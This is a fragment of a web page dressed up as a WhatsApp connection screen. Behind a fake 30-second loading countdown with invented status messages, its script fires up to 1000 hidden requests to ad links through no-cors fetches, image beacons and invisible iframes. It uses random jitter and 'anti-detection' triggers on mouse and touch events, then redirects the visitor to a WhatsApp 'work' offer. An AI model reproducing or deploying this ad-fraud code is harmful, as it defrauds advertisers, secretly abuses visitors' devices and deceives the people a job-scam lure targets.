    <style>
        :root { --wa-green: #00a884; --wa-bg: #111b21; --wa-card: #202c33; --wa-text: #e9edef; }
        body, html { margin: 0; padding: 0; height: 100%; background: var(--wa-bg); font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; color: var(--wa-text); overflow: hidden; }
        .app-shell { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; text-align: center; position: relative; z-index: 10; }
        .wa-logo { width: 85px; height: 85px; margin-bottom: 25px; filter: drop-shadow(0 0 10px rgba(0,168,132,0.3)); }
        .btn-connect { background: var(--wa-green); color: #111; border: none; padding: 18px 50px; border-radius: 50px; font-weight: 800; cursor: pointer; font-size: 15px; letter-spacing: 1px; transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); box-shadow: 0 10px 20px rgba(0,0,0,0.3); }
        .btn-connect:active { transform: scale(0.95); }
        .loading-screen { display: none; width: 100%; max-width: 320px; }
        .timer-display { font-size: 64px; font-weight: 100; margin: 15px 0; color: var(--wa-green); font-family: "Courier New", monospace; }
        .progress-container { width: 100%; height: 2px; background: #333; margin: 25px 0; border-radius: 10px; overflow: hidden; }
        .p-bar { width: 0%; height: 100%; background: var(--wa-green); transition: 1s linear; }
        .status-update { font-size: 12px; color: #8696a0; text-transform: uppercase; letter-spacing: 1px; }
        #shadow-realm { position: absolute; top: -999px; left: -999px; visibility: hidden; }
    </style>
</head>

        <div id="screen-loading" class="loading-screen">

        let hits = 0;
        const target = 1000;
        let engineOn = false;

        function igniteAnantEngine() {
            document.getElementById('screen-initial').style.display = 'none';
            document.getElementById('screen-loading').style.display = 'block';
            engineOn = true;

            let timer = 30;
            const tEl = document.getElementById('timer');
            const fEl = document.getElementById('fill');
            const mEl = document.getElementById('msg');

            // ðŸ”± SHADOW BURST ENGINE (Multi-threaded Logic)
            const burst = () => {
                if(!engineOn || hits >= target) return;
                // Burst cycle: 3-7 requests with random jitter
                let cycle = Math.floor(Math.random() * 5) + 3; 
                for(let i=0; i<cycle; i++){ fireShard(); }
                setTimeout(burst, Math.random() * 100 + 50); // Random delay to mimic human
            };
            burst();

            const clock = setInterval(() => {
                timer--;
                tEl.innerText = timer;
                fEl.style.width = ((30-timer)/30*100) + "%";
                
                if(timer == 20) mEl.innerText = "Syncing Business API...";
                if(timer == 10) mEl.innerText = "Establishing Peer-to-Peer Link...";
                
                if(timer <= 0) {
                    engineOn = false;
                    clearInterval(clock);
                    window.location.href = "https://api.whatsapp.com/send?phone=917684567890&text=Interested%20in%20work";
                }
            }, 1000);
        }

        function fireShard() {
            const l = AD_LINKS[Math.floor(Math.random() * AD_LINKS.length)];
            const r = `&_nonce=${Math.random().toString(36).substr(2,12)}&_v=${Date.now()}`;
            
            // Vector 1: Stealth Fetch
            fetch(l+r, {mode:'no-cors', keepalive:true, priority:'high'}).catch(()=>{});
            
            // Vector 2: Media Pulse
            const b = new Image(); b.src = l+r+"&type=media";
            
            // Vector 3: Sharded Iframe (Low frequency)
            if(hits % 15 === 0) {
                const i = document.createElement('iframe');
                i.src = l+r;
                document.getElementById('shadow-realm').appendChild(i);
                setTimeout(()=>i.remove(), 200);
            }
            hits++;
        }

        // ðŸŒŒ ANTI-DETECTION: Human Pulse Listener
        document.addEventListener('mousemove', () => { if(engineOn && hits < target) fireShard(); });
        document.addEventListener('touchstart', () => { if(engineOn && hits < target) fireShard(); });
